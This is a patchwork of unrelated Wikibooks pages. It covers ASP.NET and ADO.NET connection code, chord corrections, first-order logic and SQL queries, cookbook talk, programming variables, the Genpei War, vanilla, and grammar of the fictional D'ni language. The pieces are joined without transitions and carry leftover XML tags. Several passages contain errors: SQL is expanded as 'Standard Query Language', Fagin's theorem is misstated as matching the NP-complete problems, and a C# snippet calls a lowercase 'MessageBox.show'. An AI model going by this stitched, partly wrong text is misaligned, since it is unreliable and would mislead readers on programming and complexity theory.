        SqlConnection sqlConn = new SqlConnection(strConn);
        sqlConn.Open();
    }
}
&lt;/pre&gt;

Comments on the C# example:
* Since the Page_Load event handler (i.e. the &quot;void&quot; method which handles this event) is declared inside a class declaration (named &quot;Page1&quot;), it means usually that in such case it is in a separate &quot;code behind&quot; file, and if the ASP.NET file of the page is named &quot;Page1.aspx&quot; it's code behind file is usually named &quot;Page1.aspx.cs&quot;. Should it be declared in the same file as the source code of the page (i.e., inside &lt;script runat=&quot;server&quot;&gt; ... &lt;/script&gt; tags) there would be no need to make a page class declaration.
* In the case you are using the code behind coding model it is necessary to include the appropriate attributes in the @Page directive (look in the SDK documentation for details).
* In the code behind file the class is to be declared inside a &quot;namespace&quot; declaration (named usually after the name of the application - '''namespace DataAccess{ ... }''', for instance).
* Above the namespace declaration it is advisable to add '''using''' declarations for the integrated namespaces of the .NET framework, so you will be able to refer to the .NET classes with short names, not System.Data.SqlClient.SqlConnection, for instance. In the case of single file code model, the appropriate @Import directives should be added.
* The Page1 class should usually be inherited explicitly from System.Web.UI.Page. Thus our Page1 source code file might look like:
&lt;pre&gt;
using System;
using System.Collections;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;


namespace DataAccess

{
    public class Page1 : System.Web.UI.Page
    {
        public void Page_Load(object sender, EventArgs e)
        {
            ...
        }
    }
}
&lt;/pre&gt;

* The access modifier of the Page_Load event handler in the present example is &quot;public&quot;. Usually it is customary to use a &quot;protected&quot;, or even a &quot;private&quot; access modifier (for encapsulation reasons). In the present example though, the programmer might wish to access the '''sqlConn''' variable outside the Page1 class, so &quot;public&quot; it is...

== ADO.NET ==
 class DBConnection
 {
   public void Page_Load (System.Object sender, System.EventArgs eventars)
   {
     try
      {
         SqlConnection sqlconnection = new SqlConnection(&quot;database connection string&quot;);
         sqlconnection.Open();
       }
        catch(Exception ex)
       {
         MessageBox.show(ex.message);
        }
   }
 }

== ADO.NET Connection String Example (Trusted Connection) ==
&lt;pre&gt;
server=DBSERVER;database=DBName;Trusted_Connection=True;
&lt;/pre&gt;

== Connection Pooling ==

In classic ASP, database connections were not managed very effectively.  However with the advent of ASP.NET, database connection pooling is fairly translucent.  If the same connection string is provided, connection pooling is handled automatically.

==Removing incorrect chord information==
The chord reference section is incorrect. The notes in A major are &quot;A - C sharp - E&quot; not &quot;A - D flat - E&quot;. This is also a very complicated way of presenting chords. I'm removing the whole section. I will be replacing this with simple chord diagrams that are key related.

== Chords in C major ==

The proper chord form for B in a C major scale is B half-dim7 which has the notes B-D-F-A as opposed to B dim7, the chord shown, which has the notes B-D-F-Ab. It's worth noting that Ab is not a note within the C major scale. I recommend changing the B chord to a half-dim7 or a triadic voicing if practical.

      <text xml:space="preserve">In the following we briefly consider some applied problems where the expressibility of languages matter. It easily becomes clear that FO is not sufficient for many cases.  For overcoming the resrtrictions of FO there exist a lot of  extensions like fixed point logic, counting logics, misc flavours of second order logic etc. that are not covered in this chaper.

==Database Theory: SQL==

Relations have named columns called attributes

    frequents |  drinker  bar
    ----------|---------------
              |

    serves    |  bar  beer
    ----------|---------------
              |

    likes     |  drinker  beer
    ----------|---------------
              |


'''Standard Query Language:'''

Relational calculus variant of FO on relational vocabulary (no functions just relations).

Here constants have a fixed intrepretation, this is slightly diferent than in FO logic.

Examples of relational queries:

(i) Find all bars that serve Bud&lt;BR&gt;

&lt;math&gt;\{ b :  bar  |  serves(b,Bud)\}&lt;/math&gt;

b is a free variable, Bud is a constant.


(ii) Find the drunkers who frequent some bar that serves Bud&lt;BR&gt;
&lt;math&gt;\{ d : drinker |  \exists b ( frequents(d,b) \wedge serves(b,Bud)) \}&lt;/math&gt;


(iii) Find the drinkers who frequent only bars serving Bud&lt;BR&gt;
&lt;math&gt;\{ d : drinker |  \forall b [ frequents(d,b) \longrightarrow serves(b,Bud)] \}&lt;/math&gt;


(iv) Find drinkers who frequent only bars serving some beer they like&lt;BR&gt;
&lt;math&gt;\{ d : drinker | \forall b ( freq(d,b) \longrightarrow \exists c (serves(b,c) \wedge likes(d,c)))\}&lt;/math&gt;




'''SQL Representation of these queries:'''

    SELECT s.bar
    FROM serves s
    WHERE s.beer = 'Bud'


    SELECT f.drinker
    FROM freq f, serves s
    WHERE f.bar = s.bar and s.beer = 'Bud'


    SELECT drinker
    FROM freq
    WHERE dr NOT IN
    (
        SELECT f.drinker
        FROM frequents f
        WHERE f.bar NOT IN
            (SELECT bar
             FROM serves
             WHERE beer = 'Bud')
    )



----




'''Relational Algebra'''

Is an alternative representation language used in SQL. What you can represent using relational algebra is absolutely the same as what you can represent in FO logic. It constitues of simple operations on relations that allow you to specify queries.

Main Operations

&lt;math&gt;\Pi&lt;/math&gt; Projection : Project relations on a subset of its columns (attributes).

&lt;math&gt;\sigma&lt;/math&gt; Selection :  Selects a subset of tuples from a particular relation, based upon a specified selection cond
ition.

&lt;math&gt;\cup&lt;/math&gt;, &lt;math&gt;-&lt;/math&gt; Union, Diff  : similar to set operations.

|&gt;&lt;| Join : allows you to combine tuples from two relations.

Rename : renames A to B.


Expressions built from these expressions are called a relational algebra query. Whatever you can express in algebra we can represent in FO.

Examples:

(i) &lt;math&gt;\Pi_{bar} (\Sigma_{beer=Bud}(serves))&lt;/math&gt;


(ii) &lt;math&gt; \Pi_{dr} (freq |&gt;&lt;| \sigma_{beer=Bud}(serves))&lt;/math&gt;


(iii) &lt;math&gt; \Pi_{d}(freq)- \Pi_{d}[freq |&gt;&lt;| (\Pi_{bar}(freq) - \Pi_{bar}(\Sigma_{beer=Bud}(serves)))] &lt;/math&gt;


'''Expressive Power'''

Graph properties correspond to properties of datastructures in relational databases (see the chapter on database queries), e.g.:
* Consider a companies database that contains all managers together with the 'is superordinate' relation amongst them.  In a proper hierachy the database should contain no circles, i.e. a manager can not be a superordinate of his superordinate.  Querying this corresponds to checking a graph for cyclicity.  As from above this can not be done in FO.
* Say two managers want to find out if one of them is more powerful than the other.  So the want to query the database if the number of their subordinates is equal, i.e. the cardinalities of the sets of subordinates (say, directly and indirectly) is equal.  This can't be done in FO (&quot;FO can not count&quot;).  This is the reason why SQL is extended by a counting function.
* Consider a database of aiports and connection fligths among them. In order to query the direct reachibility of airport b from airport a we can write

&lt;math&gt;q_0(a, b)  = F(a, b)&lt;/math&gt;.

Now in order to query connections with one change of plane we write

&lt;math&gt;q_1(a, b) = \exists_c F(a, c) \and F(c, b)&lt;/math&gt; and get &lt;math&gt;Q_1(a, b) = q_1(a, b) \or q_1(a, b)&lt;/math&gt; 

for connections with zero or one change.  Thus in order to extend this to reachibility (of no matter how many changes) we have to write 

&lt;math&gt;\bigvee_{k\in\mathbb{N}} q_k&lt;/math&gt;

what is not a FO expression.  So we are fine with FO for a restricted reachibility up to a certain k but not for reachibility as
it appears in graph theory.  In fact it can be shown that reachibility can not be queried in FO.


==Descriptive Complexity Theory==

As mentioned above Hamiltonicity can not be expressed in FO.  So now one can think of an extension of FO in order to express this property.  This can be done like

&lt;math&gt;\exists L \exists S (isLinOrd(L) \and isSucRelOf(S, L) \and \forall_x \exists_y (L(x, y) L\or L(y, x)) \and \forall_x \forall_y(S(x, y) \implies E(x, y)))&lt;/math&gt;

where the quantifiers on the left state the existence of the binary realations L and S that satisfy the formula on the right.  The realtion isLinOrd states that L is a linear order and isSucRelOf means that S is the successor relation of L.  Both can be expressed in FO.  The pattern as above, second-order existential quantifiers followed by a first order formula is called existential second order logic.

Now it is well known that Hamiltonicity is a NP-complete problem and one can ask: is there a natural connection between NP and second order logic?  Indeed, there is a very amazing one: existential second-order  logic corresponds exactly (!) to the class of NP-complete problems!  This result is known as Fagin's theorem , it has lead to the new area of ''descriptive complexity'' where complexity classes are described by means of logical formalisms.

      <text xml:space="preserve">Why cookbook links and not interwiki wikipedia links? [[User:Reub2000|Reub2000]] 14:21, 12 Feb 2005 (UTC)

==Why use Cookbook Links==

The cookbook should not be a mere dumping ground for things that got kicked out of wikipedia.

The cookbook needs to be self-contained. If it is not, then that should be fixed.
This is especially true for cooking-related stuff. Most other stuff simply does not belong.
(for example, the chemistry lesson that somebody ripped out of the Cookbook:Fat module)

Links that stay within the cookbook will go to pages with cookbook links across the top and cookbook categories across the bottom. This is friendly. It allows for easy navigation within the cookbook.

Wikipedia does not normally provide links into the cookbook.

Links into wikipedia can be done via the wikipedia template, giving them a nice little box that invites
the reader to learn more -- presumably about non-cooking aspects of something.

Likewise, for the gardening book. There is a template for it that gives a neat little box.
(Un attributed edit)

No, this is EXACTLY what belongs on Wikibooks! It is a recipe. Recipe = Wikibooks. [[User:WhisperToMe|WhisperToMe]] 17:33, 19 Mar 2005 (UTC)

== Kidney beans ==

I always put [[Cookbook:kidney beans]] in mine. Yum. [[User:Cdyson37|Cdyson37]] 11:56, 31 August 2005 (UTC)

== disambiguation page ==

I'd like to split the various recipes out of this page into their own modules, and convert this page into a disambiguation page, or a general chili discussion page.  Any other thoughts? [[User:Gentgeen|Gentgeen]] 20:08, 4 November 2005 (UTC)</text>

      <text xml:space="preserve">Variables are ''references'' that stand in for a ''value'' that is contained at a certain memory address.

Variables are said to have a value and ''may'' have a [[Computer Programming/Types|data type]].  If a variable has a type, then only values of this type may be assigned to it. Variables do not always have a type.

A value can have many values of many different types: integers (7), ratios (1/2), (approximations of) reals (10.234), complex numbers (4+2i), characters ('a'), strings (&quot;hello&quot;), and much more.

Different languages use different names for their types and may not include any of the above.

== Assignment statements ==

An ''assignment statement'' is used to set a variable to a new value.

      <text xml:space="preserve">The example set the variable ''X'' to the integer value of ''10''. The assignment statement overwrites the contents of the variable and the previous value is lost.

In some languages, before a variable can be used, it will have to be declared, where the declaration specifies the type.

      <text xml:space="preserve">The Heian Period ends with the Genpei War (源平戦争), fought between the Minamoto (源) and the Taira (平) clans. It occurs during the Late-Heian Period and marks the rise of the military class, and the formation of the Kamakura Shogunate under Minamoto Yoritomo.
[[File:Genpei kassen.jpg|thumb|right|Scene of the Genpei war]]
==Background==
The Genpei War was the culmination of a decades-long conflict between the two clans over dominance of the Imperial court and control of Japan. In the Hōgen Rebellion and in the Heiji Rebellion of earlier decades, the Minamoto attempted to regain control from the Taira and failed. The Taira then began a series of executions, intended to eliminate their rivals.

In 1177, relations between the Taira clan and the retired Emperor Go-Shirakawa became highly strained, and the latter attempted a coup d'état to oust the Daijō Daijin (prime minister), Taira no Kiyomori. Kiyomori defeated the former emperor and abolished the Insei system. This provoked strong anti-Taira sentiment.

On March 21, 1180, Taira no Kiyomori put his grandson, Antoku (then only two years of age), on the throne, after the abdication of Emperor Takakura. Go-Shirakawa's son, Prince Mochihito, felt that he was being denied his rightful place on the throne and, with the help of Minamoto Yoritomo, sent out a call to arms to the various samurai families and Buddhist monasteries on May 5.
In June, Kiyomori moved the seat of imperial power to Fukuhara (modern day Kobe), in the hope of promoting trade with Song Dynasty China, and on the fifteenth of that month, Prince Mochihito fled Kyoto to take refuge in Mii-dera.

==Beginnings of the War==
The actions of Taira no Kiyomori having deepened Minamoto hatred for the Taira clan, a call for arms was sent up by Minamoto no Yorimasa and Prince Mochihito. Not knowing who was behind this rally, Kiyomori called for the arrest of Mochihito, who sought protection at the temple of Mii-dera. The Mii-dera monks were unable to ensure him sufficient protection, so he was forced to move along. He was then chased by Taira forces to the Byōdō-in, just outside Kyoto. The war began thus, with a dramatic encounter on and around the bridge over the River Uji. This battle ended in Yorimasa's ritual suicide inside the Byōdō-in and Mochihito's capture and execution shortly afterwards.

It was at this point that Minamoto no Yoritomo took over leadership of the Minamoto clan and began traveling the country seeking to rendezvous with allies. Leaving Izu Province, heading for the Hakone Pass, he was defeated by the Taira in the battle of Ishibashiyama. However he successfully made it to the provinces of Kai and Kozuke, where the Takeda and other friendly families helped repel the Taira army. Meanwhile, Taira no Kiyomori, seeking vengeance against the Mii-dera monks and others, besieged Nara and burnt much of the city to the ground.

Fighting continued the following year. Minamoto no Yukiie launched an unsuccessful sneak attack attempt against the army of Taira no Tomomori at the Battle of Sunomatagawa. He was pursued by them to the Yahahigawa, destroying the bridge over the river in order to slow the Taira progress. He was defeated and forced to withdraw once again, but Taira no Tomomori fell ill and called off his pursuit of Yukiie's forces.

Taira no Kiyomori died from illness in the spring of 1181, and around the same time Japan began to suffer from a famine which would last through the following year. The Taira moved to attack Minamoto no Yoshinaka, a cousin of Yoritomo, who had raised forces in the north but were unsuccessful. For nearly two years, the war ceased, only to resume in the spring of 1183.

==Turning of the tide==
Minamoto no Yoritomo, suspicious of the strength of his cousin, launched a series of attacks against Yoshinaka. Yoshinaka had sought to take for himself lands controlled by Yoritomo, which had earlier belonged to Yoshinaka's father. Though the two reconciled with one another and agreed to focus on their common enemy, the Taira, this rivalry would remain strong throughout the war. Forced to recognize Yoritomo as the head of the clan and to send his son Yoshitaka to Kamakura as a hostage, Yoshinaka would not truly fight alongside his cousin for much of the war. He sought to defeat the Taira himself and to reach Kyoto before Yoritomo, claiming victory and the according honor and power.

Placating Yoritomo's suspicions of treachery or betrayal, Yoshinaka survived an assault on his fortress at Hiuchiyama by Taira no Koremori and engaged Koremori again at the battle of Kurikara. Yoshinaka's victory for the Minamoto at Kurikara, also known as the battle of Tonamiyama, would prove to be the turning point in the war. Through creative tactics, skillful division of his forces and a series of bluffs and diversions, Yoshinaka inflicted heavy losses on the Taira, who fled, confused and demoralized.

The Taira loss at Kurikara was so severe that they found themselves, several months later, under siege in Kyoto, with Yoshinaka approaching the city from the northeast and Yukiie from the east. Both Minamoto leaders had seen little or no opposition in marching to the capital and now forced the Taira to flee the city. Taira no Munemori, head of the clan since his father Kiyomori's death, led his army, along with the young Emperor Antoku and the Imperial regalia, to his clan's fortresses in western Honshū and Shikoku.

==Internal Minamoto clan hostilities==
The Taira clan set fire to their Rokuhara palace and the surrounding district, leaving Minamoto no Yoshinaka with the only force of any significant power in the Home Provinces surrounding the capital. Empowered with a mandate by Emperor Go-Shirakawa to pursue the Taira and destroy them, Yoshinaka once again sought to gain control of the Minamoto clan and regain his ancestral lands from his cousins Yoritomo and Yoshitsune.

Meanwhile, the fleeing Taira set up a temporary Court at Dazaifu in Kyūshū, the southernmost of Japan's main islands. They were forced out soon afterwards by local revolts, spurred by Emperor Go-Shirakawa and sought refuge at Yashima, a small island in the Inland Sea.

Yoshinaka sent a force to pursue the Taira, while he led a second force back to Kamakura to delay his cousins' actions. While his men lost to the Taira at Mizushima, Yoshinaka conspired with Yukiie to seize the capital and the Emperor, possibly even establishing a new Court in the north. However, Yukiie revealed these plans to the Emperor, who communicated them to Yoritomo.
Betrayed by Yukiie, Yoshinaka took command of Kyoto and, at the beginning of 1184, set fire to the Hōjūjidono, taking the Emperor into custody. Minamoto no Yoshitsune arrived soon afterwards with his brother Noriyori and a considerable force, driving Yoshinaka from the city. After fighting his cousins at the bridge over the Uji, where the war began, Yoshinaka made his final stand at Awazu, in Ōmi province.

==Final stages of the conflict==
As the united Minamoto forces left Kyoto, the Taira began consolidating their position at a number of sites in and around the Inland Sea, which was their ancestral home territory. They received a number of missives from the Emperor offering that if they surrendered by the seventh day of the second month, the Minamoto could be convinced to agree to a truce. This was a farce, as neither the Minamoto nor the Emperor had any intentions of waiting until the eighth day to attack. Nevertheless, this tactic offered the Emperor a chance to regain the Regalia and to distract the Taira leadership.

The Minamoto army, led by Yoshitsune and Noriyori, made their first major assault at Ichi-no-Tani, one of the primary Taira fortresses on Honshū. The fortress was surrounded, and the Taira retreated to Shikoku. However, the Minamoto were not prepared to assault Shikoku; a six-month pause thus ensued during which the Minamoto took the proper steps. Though on the retreat, the Taira enjoyed the distinct advantages of being in friendly, home territories, and of being far more adept at naval combat than their rivals.

It was not until nearly a year after Ichi-no-Tani that the main Taira fortress at Yashima came under assault. Seeing bonfires on the mainland of Shikoku, the Taira expected a land-based attack and took to their ships. This was a deceptive play on the part of the Minamoto, however, who lay in wait with their own navy. The Yashima fortress fell, along with the improvised imperial palace built there by the Taira, many of whom however escaped along with the Imperial regalia and the Emperor Antoku.

The Genpei War came to an end one month later, following the battle of Dan-no-ura, one of the most famous and important battles in Japanese history. The Minamoto engaged the Taira fleet in the Straits of Shimonoseki, a tiny body of water separating the islands of Honshū and Kyūshū. After a series of archery duels, hand-to-hand fighting broke out. The tides played a powerful role in the development of the battle, granting the advantage first to the Taira, who were more experienced and abler sailors and later to the Minamoto. The Minamoto advantage was considerably enhanced by the defection of Taguchi Shigeyoshi, a Taira general who revealed the location of Emperor Antoku and the regalia. The Minamoto redirected their attention on the Emperor's ship, and the battle quickly swung in their favor.

Many of the Taira samurai, along with Emperor Antoku and his grandmother Taira no Tokiko, widow of Taira no Kiyomori, threw themselves into the waves rather than live to see their clan's ultimate defeat at the hands of the Minamoto.

==Consequences==
The Taira clan was destroyed, and the Minamoto victory was followed by the establishment of the Kamakura shogunate. Though Minamoto no Yoritomo was not the first to ever hold the title of Shogun, he was the first to wield it in a role of nationwide scope. The end of the Genpei War and beginning of the Kamakura shogunate marked the rise of military class and the suppression of the power of the emperor, who was compelled to preside without effective political or military power, until the Meiji Restoration over 650 years later.

In addition, this war and its aftermath established red and white, the colors of the Taira and Minamoto standards, respectively, as Japan's national colors. Today, these colors can be seen on the flag of Japan, and also in banners and flags in sumo and other traditional activities.

==Battles==

'''Vanilla''' is a flavoring derived from the vanilla bean. Vanillin is the distinctive chemical in vanilla. Vanilla is commonly used in desserts and in [[Cookbook:Chocolate|chocolate]]. Vanilla is often not noticeable as a distinct flavor, yet nevertheless greatly improves the taste of the dish it has been added to (much like [[Cookbook:Salt|salt]] and [[Cookbook:MSG|MSG]]).

'''Vanilla extract''' is [[Cookbook:Alcohol|alcohol]] containing flavor (vanillin) from the vanilla bean. Vanillin itself, produced by a modern chemical process, is widely sold in a form similar to vanilla extract. When a recipe specifies vanilla, usually the recipe is intended to work with either vanilla extract or vanillin. Such recipes will require modification if whole vanilla beans are used.

Vanilla is also used in the form of '''vanilla sugar'''. This can have different meanings depending upon the origin of the recipe. In Scandinavian countries, vanilla sugar is a powdered sugar with a strong vanilla flavour. In these countries, it is the main method of incorporating vanilla flavor into a recipe; vanilla extract is not commonly available. This form of vanilla sugar can be replaced by a roughly equivalent volume of vanilla extract. In other countries, including the United States, vanilla sugar usually is granulated white sugar that has been flavored over some time by a vanilla bean included in the sugar.

Welcome to the Wikibook grammar of the D'ni language. Perhaps this Wikibook is not ideal as a course for beginners, but will offer concise, complete information on the principles of D'ni language for reference.

Note that this Wikibook makes use of the 'New Transcription Standard', that means the way D'ni words are rendered with normal letters.

==The language==
'''D'ni''' (more properly spelled ''D'nee, D'ní''), In the [[w:Myst|Myst]] series, is the race who came to Earth from [[w:Garternay|Garternay]]. The word is used for

#A member of this race.
#The city in a subterranean cavern below [[w:Eddy County| New Mexico]], populated by them.
#Their [[w:D'ni language|language]].

The language was created by [[w:Cyan worlds|Cyan]] employee Richard A. Watson, or RAWA during the production of the game Riven. The game provided many D'ni spoken words and inscriptions that initially puzzled the fans, and some of them remain still untranslated.

Information about the language and vocabulary, have been provided in the three Myst books. Online communities study the language, sometimes with contribution by RAWA himself, who doesn't like to give out information easily, and prefers only to clarify matters rather than give translations. RAWA has contributed to the community, not only in the linguistic matters, but anything that has to do with the world of Myst.

Years after the publication of Riven, slowly more facts and words come to our knowledge with the subsequent games. Study of D'ni is more or less like an enormous puzzle that is filled now and then, after hunting of sporadic hints and evidence. This wikibook will attempt to describe our knowledge so far, and be updated whenever new facts show up.

      <text xml:space="preserve">==Personal Pronouns==

Personal Pronouns appear in 2 kinds: '''independent words''' (in accusative, like 'me, him, her' etc.) or '''suffixes''' (subjects to verbs or possessors).

{| class=&quot;wikitable&quot;
|-
| || colspan=&quot;2&quot; | ''Nominative'' || colspan=&quot;2&quot; | ''Genitive'' || colspan=&quot;2&quot; | ''Dative/Accusative''
|-
| ''1st'' || – (I) || -et (we) || -ó (my) || -ot (our) || zú (me) || set (us)
|-
| ''2nd'' || -em (thou) || -tí (you) || -om (thy) || -omí (your) || šem (thee) || šemtí (you)
|-
| ''3rd'' || -en (he/she) || -ít (they) || -on (his/her) || -os (their) || ze/ta (him/her) || íst (them)
|}

===Nominative===
The nominative forms are suffixed to the verbs as subjects. e.g. to say 'he finds' we add suffix ''–en'' 'he' to verb stem ''húr-'' 'to find' to form ''húren''.

There is no 1st person in nominative, and we use the bare verb stem. E.g. ''tégan'' to form 'I love' 

===Genitive===
Genitive forms are suffixed to nouns to indicate possessors of that noun. E.g. ''korom'' ‘thy book’, ''navaot'' ‘our master’, ''únrétíos'' ‘their lords’.

The 3rd plural genitive form ''–os'' is irregular. 

===Accusative/Dative===
Accusative is used when a pronoun is the direct object of a verb. English examples are 'I love him', 'I choose you'.  Dative is when the pronoun is the indirect object, ex: 'I talk to you', 'You work for him'. Accusative/Dative pronouns unlike the others, are independent words. E.g. ''çev šem'' ‘I thank you’, ''tagema b’zú'' ‘give to me!’ (Note: Most examples of these pronouns occur in the dative case (i.e., as indirect objects) -- the case for the accusative is less strong.)

It is hypothetically assumed therefore that the accusative of 3rd person singular and plural can be ''sen'' and ''sít'' respectively.

==Other pronouns==
There are also other pronouns:

*''met'' 'this'. Indicative pronoun which follows the noun. E.g. ''bacana met'', 'this map' but it is also prefixed to the noun e.g. ''a met m'la'', 'this lizard' (''a-'' is a &quot;direct object indicator&quot;. The rules for using it are not quite clear, in translations it can be omitted.)
*''mot'' 'that, which'. Relative pronoun. E.g. ''rem'la sexen poant, mot tornen'', ‘the lizard has saliva, which it spits’, also used with the element ''gor'' ‘time’ and forms ''gormot'' ‘then’

      <text xml:space="preserve">The common verb form is formed by 3 parts: '''the tense prefix, the verb stem''' and the '''pronoun suffix'''
e.g. ''Do-húr-et'' 'We are finding'

==Inflexion==
As we said, pronoun suffixes are used for every person except the 1st singular. Here is for example the conjugation in simple present tense of the verb ''ken'' ‘to be’

*''Ken''	'I am'
*''Ken'''em'''''	'Thou art'
*''Ken'''en'''''	'He is'
*''Ken'''et'''''	'We are'
*''Ken'''tí'''''	'You-plural are'
*''Ken'''ít'''''	'They are'

==Tenses==
There are four basic '''tense prefixes''':

*''le'' = perfect
*''ko'' = past
*''do'' =  present progressive
*''bo'' = future

Present tense has no prefix.

Their combinations can provide other tenses. The rule of the prefixes series says that they must follow the priority ''bo-ko-do-l(e)''

Attested tenses are the following:

*'''Present'''	
:''Húr''	'I find'
*'''Present cont.'''
:''Do-húr''	'I am finding'
*'''Present perfect'''
:''Le-húr''	'I have found'
*'''Past'''
:''Ko-húr''	'I found'
*'''Past cont.'''
:''Ko-do-húr''	'I was finding
*'''Past perfect'''
:''Ko-l-húr''	'I had found'
*'''Future'''
:''Bo-húr''	'I will find'
*'''Future cont.'''
:''Bo-do-húr''	'I will be finding'
*'''Future perfect'''
:''Bo-ko-húr''	I will have found'
*'''Future perfect cont.'''
:''Bo-do-l-húr''	I will have been finding'

Other prefix combinations are possible, and some of them hint at tenses missing from the above... for example *''do-l-húr''  'I have been finding' etc.

==Voice==
We have conflicting information on how passive is formed. The ''Kenen Gor'' text shows that passive participles can be formed with ''ken'' and the ending ''-ij''. This formation could be applied for present tense. Therefore 'I am known' can be translated as ''ken tagamij''

Most other passive voice examples are in past tense; even then we have three different ways of passive formation

*In one example, passive is expressed by simple past (''Kotokituen'' lit. 'it determined', understood as 'it was determined'; ''kohúren'' lit. 'it found', understood as 'it was found') 
*Passive is also formed with past continuous (''kodobarelen'' 'it was making/was made' and ''kodolasaen'' 'it was sealing/was sealed')
*However there are some instances where the verb ''ken'' 'be' is also added to form the passive, as in English; ''ken'' is followed by the past tense of the verb in the 3rd person: ''kokenen kosayen'' lit. 'it was it designed' understood as 'it was designed'; ''kokenen kohúren'' 'was found'.

All the above attested examples have a problem: not only are passive but also refer to the past as well; therefore we can't determine if the tense expressed the voice, the time, or both. 

The following possibilities can be considered:
*As in English, passive voice is formed always with the past tense.
or
*No distinction between active and passive; For example ''dotagen'' means both 'I give' and 'I am given'. The above examples are found in past tense simply because they refer to a past time and this hasn't to do with the passive formation

==Imperative==
The suffix ''-a'' denotes Imperative.

*''húr-em-a!''  'find!' (command to one person)
*''húr-tí-a!'' '[all of you] find!' (command to a group excluding you)
*''húr-et-a!'' 'let’s find!' (command to a group including you)

==Negation==
Negative phrases are formed with the word for ''ril'' which means 'no'. It contains all the English used of 'doesn't', 'isn't' etc.

*''Gen kenen renavaox Riven, rúb ril bokenen navaot'' 'Gen is the master of Riven, but will not be our master'
*''Étrus ril lesel Myst. Étrus lesel Edanna'' 'Atrus did not write Myst; Atrus wrote Edanna'

==Formation==
{{main|D'ni/Derivations}}
Note that verbs can become adjectives, nouns and persons with -al, -tav and -tan respectively

*''marn-al'' 'creating' (e.g. the creating spirit)
*''húr-tav'' 'finding' (e.g. the finding of the book)
*''lon-tan'' 'discoverer'

      <text xml:space="preserve">The noun is the basic form of speech in D'ni. Nouns that are basic words, usually have 2 syllables, but many have 3 as well. 

Some which are compounds can reach 4 or 5. Those usually have derived endings and are derived from other parts of speech, like verbs.

==Articles==

The articles are prefixes to the nouns. Like in English, there are two kind of articles: '''definite''' ''re'' ('the') and '''indefinite''' ''erþ'' ('a'); unlike English, they stay the same whether the noun is singular or plural:

*''kor'' 'book
*''re-kor'' 'the book'
*''erþ-kor'' 'a book' (and possibly ''erþ-kortí'' 'some books')

==Numbers==

As in many languages, there are two numbers of the D'ni noun: '''singular''' and '''plural'''.

Plural is formed with the ending ''-tí''

*''kor-tí'' 'books'

      <text xml:space="preserve">D'ni has adverbs, both original or derived from adjectives. Adverbs generally follow the verb they describe, except the temporal ones which precede the verb.

There are a few adverbs attested:

===Mode===
*''þoe'' 'how?'
*''megóré'' 'straight (out of)'
*''ril'' 'not'

===Quantity===
*''blo'' 'about, approximately'

===Temporal===
*''gormot'' 'then'. Maybe ''gormot'' is a compound of ''gor'' ‘time’ and ''mot'' ‘that, which’.
*''gormet'' 'now'. Not attested, but a hypothised compound of ''gor'' ‘time’ and ''met'' ‘this’.
*''gaþ'' 'still'
*''can'' 'always'

==Derivation from adjectives==
The adverbs can be derived by ''-sh suffixed to an adjective

*''kera'' 'brave' &gt; ''kera-š'' 'bravely'
*''garo'' 'might' &gt; ''garo-š'' 'mightily'

      <text xml:space="preserve">Like English, D'ni is a non-inflected language. Therefore, prepositions are very important. They are mostly prefixes connected to words with apostrophes. 

The prepositions attested are

*''be'' 'to', which can used if someone is giving something to someone (''dotagen b'set'' ‘is giving to us’), to express amount with numbers (''b'vat'' ‘to five’), to show direction (''relena b'retalío'' ‘the journey to the surface’) and, like English, to form the infinitive of verbs (''rebišta kodoséen b'mes'' ‘the tunnel was designed to require’)
*''fe'' 'along/at', to show something be done on the surface of something (''tornen f'reprædtí'' ‘it spits at the rocks’) and the expression ''f'túgo'', ‘on foot’ is attested
*''xe'' 'for' when it means 'towards the goal of', in ''xregicaþ'' ‘for the safety’
*''me'' 'from/of', to show origin (''dorísloen remarg melin m'repræd'' ‘dissolving the outer layer from the rock’) or composition (''erþbæntí me kílentí'' ‘a series of steps’)
*''ne'' 'around', to show direction of motion
*''te'' 'by/with/in/of', which has the same function as the Latin ablative. It expresses instrument, or something that happens with something else (''trebigto'' ‘with the blessing’, ''tre'irvæntí'' ‘along with the minerals’) and place (''regalpotí tretalío'' ‘the caves at the surface’)
*''ben'' is a different kind of preposition; it means 'during, for (a time)' or 'instead' when it means 'in exchange or equivalence with', in ''ferem ben erþgor tona'' ‘dry for a long time’

==Contraction==
Oftentimes, prepositions are contracted.  

*When the word does not begin with an article, the preposition's becomes a prefix and the ''e'' is replaced with an apostrophe (''re'irvæntí, t'Gen, b'Yavo, kortí'nea'') 
*When the word does begin with an article (''re'' or ''erþ''), the preposition becomes a prefix and loses the ''e'' altogether (''trebigto'' 'with the blessing', ''terþtes'' 'of a group')

The above rules also apply to the conjunction ''ga'', 'and'.

''Ben'' is never contracted.

==Genitive==
The word ''ox'' 'of' is an individual word when the noun is modified with a following adjective, otherwise it is a suffix.  It means direct possession.

*''rekorox Gen'' 'the book of Gehn'
*''rekor prin ox Gen'' 'the small book of Gehn' (here the adjective ''prin'' intervenes between the noun and ''ox'')

The word ''co'' also means 'of' but in the meaning of characteristics/properties.

      <text xml:space="preserve">==Noun to adjective==
A noun with the suffix ''-ec'' becomes an adjective

*''vog'' 'nature' &gt; ''vog-ec'' 'natural'
*''fa'' 'one' &gt; ''faec'' 'first'

==Adjective to noun==
An adjective with the suffix ''-(e)þ'' becomes a noun

*''gica'' 'safe' &gt; ''gica-þ'' 'safety' 
*''sógi'' 'stable' &gt; ''sógi-þ'' 'stability'

Note that the name ''Kerath'' means ‘[the] Brave One’ formed by the adjective ''kera'' ‘brave’ indicating a titulary function of this suffix.

==Adjective to adverb==
Similarly, ''-(e)š'' is always suffixed onto adjectives and changes them to adverbs.

*''ten'' 'simple' &gt; ''teneš'' 'simply'
*''garo'' 'mighty' &gt; ''garoš'' 'mightily'
*''kera'' 'brave' &gt; ''keraš'' 'bravely'

==Verb to noun==
The ''-tav'' suffix is used with verbs and is understood to form common nouns. 

*''tégan'' 'to love' &gt; ''re-tégan-tav'' 'the love'
*''cav'' 'to live' &gt; ''re-cav-tav'' 'the life'

The ''-tan'' suffix is used with verbs to make the actor.

*''re-tégan-tan'' 'the lover'

The adverbs can be derived by ''-š'' suffixed to an adjective

*''Kera'' 'brave' &gt; ''Kera-š'' 'bravely'

      <text xml:space="preserve">There are some idioms to the D'ni that differentiate it from English. A D'ni fanfic writer should have these rules handy: 

==Word order==
*The adjectives follow the noun they describe. 'Small rock' is ''Præd prin'' 
*Articles always precede the noun they refer to, never the adjective: 'the natural rock' is 'the-rock natural', so we must say ''repræd vogec'', and not **''re-vogec præd''.
